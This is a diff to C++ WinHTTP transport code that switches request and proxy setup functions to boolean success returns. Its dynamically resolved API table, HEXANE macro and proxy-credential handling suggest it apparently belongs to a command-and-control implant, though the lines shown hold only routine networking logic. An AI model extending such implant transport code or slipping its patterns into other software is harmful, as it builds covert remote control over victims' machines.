@@ -34,7 +34,7 @@ namespace Http {
         } while (length > 0);
 
         (*stream) = S_CAST(_stream*, x_malloc(sizeof(_stream)));
-        (*stream)->buffer = download;
+        (*stream)->buffer = B_PTR(download);
         (*stream)->length = total;
 
         defer:
@@ -64,19 +64,20 @@ namespace Http {
         }
     }
 
-     VOID CreateRequestContext(_request_context *req_ctx) {
+     BOOL CreateRequestContext(_request_context *req_ctx) {
         HEXANE
 
         const wchar_t *endpoint = { };
+	bool success = true;
 
         if (!Ctx->transport.http->handle) {
             if (!(Ctx->transport.http->handle = Ctx->win32.WinHttpOpen(Ctx->transport.http->useragent, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0))) {
-                return_defer(ntstatus);
+                success_(false);
             }
         }
 
         if (!(req_ctx->conn_handle = Ctx->win32.WinHttpConnect(Ctx->transport.http->handle, Ctx->transport.http->address, Ctx->transport.http->port, 0))) {
-            return_defer(ntstatus);
+                success_(false);
         }
 
         if (Ctx->transport.http->endpoints) {
@@ -92,28 +93,30 @@ namespace Http {
         }
 
         if (!(req_ctx->req_handle = Ctx->win32.WinHttpOpenRequest(req_ctx->conn_handle, Ctx->transport.http->method, req_ctx->endpoint, nullptr, nullptr, nullptr, Ctx->transport.http->flags))) {
-            return_defer(ntstatus);
+                success_(false);
         }
 
         defer:
+	return success;
     }
 
-    VOID CreateProxyContext(_proxy_context *const proxy_ctx, const _request_context *const req_ctx) {
-        HEXANE
+    BOOL CreateProxyContext(_proxy_context *const proxy_ctx, const _request_context *const req_ctx) {
+        HEXANE;
 
+	bool success = true;
         if (Ctx->transport.b_proxy) {
             proxy_ctx->proxy_info.dwAccessType  = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
             proxy_ctx->proxy_info.lpszProxy     = Ctx->transport.http->proxy->address;
 
             if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, &proxy_ctx->proxy_info, sizeof(WINHTTP_PROXY_INFO))) {
-                return_defer(ntstatus);
+                success_(false);
             }
 
             if (Ctx->transport.http->proxy->username && Ctx->transport.http->proxy->password) {
                 if (
                     !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_USERNAME, Ctx->transport.http->proxy->username, x_wcslen(Ctx->transport.http->proxy->username)) ||
                     !Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY_PASSWORD, Ctx->transport.http->proxy->password, x_wcslen(Ctx->transport.http->proxy->password))) {
-                    return_defer(ntstatus);
+                    success_(false);
                 }
             }
         } else if (!Ctx->transport.b_envproxy_check) {
@@ -162,11 +165,12 @@ namespace Http {
 
         if (Ctx->transport.env_proxy) {
             if (!Ctx->win32.WinHttpSetOption(req_ctx->req_handle, WINHTTP_OPTION_PROXY, Ctx->transport.env_proxy, Ctx->transport.env_proxylen)) {
-                return_defer(ntstatus);
+                success_(false);
             }
         }
 
         defer:
+	return success;
     }
 
     VOID HttpCallback(const _stream *const out, _stream **in) {
